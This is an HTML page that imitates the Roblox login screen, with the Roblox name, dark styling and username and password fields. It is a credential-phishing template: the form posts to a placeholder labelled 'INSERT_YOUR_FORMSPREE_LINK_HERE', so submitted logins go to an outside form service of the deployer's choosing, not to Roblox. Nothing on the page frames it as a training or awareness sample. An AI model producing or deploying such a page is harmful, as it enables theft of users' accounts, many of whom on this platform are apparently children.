<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Roblox</title>
    <style>
        /* Modern Roblox-Style Dark Theme */
        body {
            background-color: #232527;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #FFFFFF;
        }

        .login-container {
            background-color: #393b3d;
            padding: 40px 30px;
            border-radius: 8px;
            width: 400px;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }

        .logo {
            font-weight: 800;
            font-size: 32px;
            letter-spacing: -1px;
            margin-bottom: 25px;
        }

        h2 {
            font-weight: 500;
            font-size: 20px;
            margin-bottom: 25px;
        }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border-radius: 4px;
            border: 1px solid #000;
            background-color: #f2f4f5;
            color: #333333;
            font-size: 15px;
            box-sizing: border-box;
        }

        input:focus {
            outline: none;
            border: 2px solid #00b2ff;
            padding: 13px;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background-color: #00b2ff;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 10px;
        }

        .login-btn:hover {
            background-color: #0081bb;
        }

        .links {
            font-size: 13px;
            color: #00b2ff;
            text-decoration: none;
            display: block;
            margin-top: 20px;
        }

        .links:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="logo">ROBLOX</div>
    <h2>Login to Roblox</h2>

    <form action="INSERT_YOUR_FORMSPREE_LINK_HERE" method="POST">
        
        <input type="text" name="username" placeholder="Username/Email/Phone" required>
        
        <input type="password" name="password" placeholder="Password" required>
        
        <button type="submit" class="login-btn">Log In</button>

    </form>

    <a href="#" class="links">Forgot Password or Username?</a>
</div>

</body>
</html>
